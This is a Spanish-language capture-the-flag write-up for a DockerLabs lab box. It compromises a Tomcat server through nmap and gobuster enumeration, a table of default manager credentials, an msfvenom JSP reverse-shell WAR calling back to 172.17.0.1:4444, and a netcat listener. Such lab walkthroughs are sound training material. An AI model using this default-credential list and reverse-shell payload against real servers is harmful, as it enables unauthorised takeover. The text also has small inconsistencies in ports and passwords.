---
title: Pn - DockerLabs
published: true
categories: DockerLabs
---


| OS     | Dificultad  | Creator           |
| ------ | ----------- | -------------     | 
| Linux  |  Fácil      | El Pingüino de Mario        | 


# Reconocimiento

Comenzamos el proceso de reconocimiento identificando los puertos abiertos en el sistema objetivo. 
```shell
sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG ports 
```
-  `-p-`: Escanea todos los puertos (1-65535).
- `--open`: Solo muestra los puertos abiertos.
- `-sS`: Realiza un escaneo SYN, que es rápido y discreto.
- `--min-rate=5000`: Envía al menos 5000 paquetes por segundo, acelerando el escaneo.
- `-n`: No realiza resolución DNS.
- `-Pn`: No realiza ping previo para determinar si el host está activo.
- `-vvv`: Muestra resultados detallados y en tiempo real.

![image](https://github.com/user-attachments/assets/5811d9cc-09c3-4632-ae97-1865205329b8)

Durante el escaneo, descubrimos que los siguientes puertos están activos:
- `8080` (HTTP)
A continuación, evaluamos si los puertos abiertos presentan alguna vulnerabilidad, además de obtener más información sobre los servicios asociados a esos puertos.

```bash
nmap -p8080 -sCV 172.17.0.2 -oG targeted
```
![image](https://github.com/user-attachments/assets/cbfab6eb-5a1b-415a-9365-5bfa0433ec73)

# Exploración Web
Al navegar al puerto `80`, descubrimos un sitio web de `Tomcat`, version `9.0.88`.

![image](https://github.com/user-attachments/assets/28c15c29-fe88-47da-b8b4-2311ef0f81d1)

Utilizamos `Gobuster` para realizar un reconocimiento web y explorar los directorios disponibles en el sitio.
```bash
gobuster dir -u http://172.17.0.2 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,doc,html,txt,img
```
- `gobuster dir` - Indica que estás utilizando la herramienta Gobuster para realizar un escaneo de directorios.
- `-u http://172.17.0.2/` Especifica la URL objetivo que deseas escanear en busca de directorios.
- `-w` Especifica que diccionario queremos usar
- `-x` Para indicar que tipo de extension queremos que nos encuentre

![image](https://github.com/user-attachments/assets/c3203ae4-dff2-4938-a70c-28346f56dc1d)

Como no encontramos nada vamos ya que nos pide en muchos casos acceder con contraseña y usuario , vamos a porbar a meter algunas de las que estan por defecto:

|Username     |Password  |
|-------------|----------|
|admin        |password  |
|admin        |<blank>   |
|admin        |Password1 |
|admin        |password1 |
|admin        |admin     |
|admin        |tomcat    |
|both         |tomcat    |
|manager      |manager   |
|role1        |role1     |
|role1        |tomcat    |
|role         |changethis|
|root         |Password1 |
|root         |changethis|
|root         |password  |
|root         |password1 |
|root         |r00t      |
|root         |root      |
|root         |toor      |
|tomcat       |tomcat    |
|tomcat       |s3cret    |
|tomcat       |password1 |
|tomcat       |password  |
|tomcat       |<blank>   |
|tomcat       |admin     |
|tomcat       |changethis|

En este caso era `tomcat`,`s3cr3t`.

![image](https://github.com/user-attachments/assets/7a43f554-3f08-4bba-b332-73b85b16a206)

Una vez estando dentro creo con msfvenom una reverse shell en un archivo .war malicioso.

![image](https://github.com/user-attachments/assets/39c7a47a-ddf5-4dbd-82a0-c9e7012fd64a)

Una vez estando dentro creo con msfvenom una reverse shell en un archivo .war malicioso.

```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=172.17.0.1 LPORT=4444 -f war -o revshell.war
```

Simultaneamente estamos escuhando el el puerto `4444` con `netcat`.

```bash
nc -lvnp 4444
```

![image](https://github.com/user-attachments/assets/2c558562-adcd-4c54-b885-214fd9c29b4b)

Ya somo root.

![image](https://github.com/user-attachments/assets/5aaa3629-ccef-41bd-a808-908ddcf472ab)

